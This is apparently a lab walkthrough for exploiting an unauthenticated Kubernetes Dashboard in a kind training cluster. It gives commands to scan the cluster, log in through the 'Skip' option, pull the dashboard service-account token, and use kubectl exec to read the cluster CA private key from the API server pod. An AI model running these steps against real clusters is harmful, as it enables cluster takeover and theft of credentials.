## Unauthenticated Kubernetes Dashboard

1. Scan the cluster `nmap -p- [CLUSTER-IP]`
2. Investigate port 31337 using curl `curl -k https://[CLUSTER-IP]:31337`. Reading the response it's clear that this is a kubernetes dashboard
3. Access the kubernetes dashboard on your browser (don't do this from the kind cluster, do this on your host machine) `https://localhost:31337` 
4. From the login page, use the "Skip" option on the login page, which authenticates you with the default service account for the service.
5. Now that we're logged into to the dashboard we can look for secrets which could be of use in escalating privileges to cluster-admin. As the Dashboard obviously has some good rights, it's a reasonable target.
   1. Change the namespace on the left hand menu to `kuberentes-dashboard`
   2. Choose the secrets resource for the `kubernetes-dashboard-token`
   3. click the view icon to see the value we need.
6. Now with the token we just need to provide it to kubectl to get our `ca.key` file
   1. `kubectl --token="[TOKEN]" -shttps://[API_SERVER_IP]:6443 --insecure-skip-tls-verify -n kube-system exec kube-apiserver-kubedash-control-plane -- cat /etc/kubernetes/pki/ca.key`
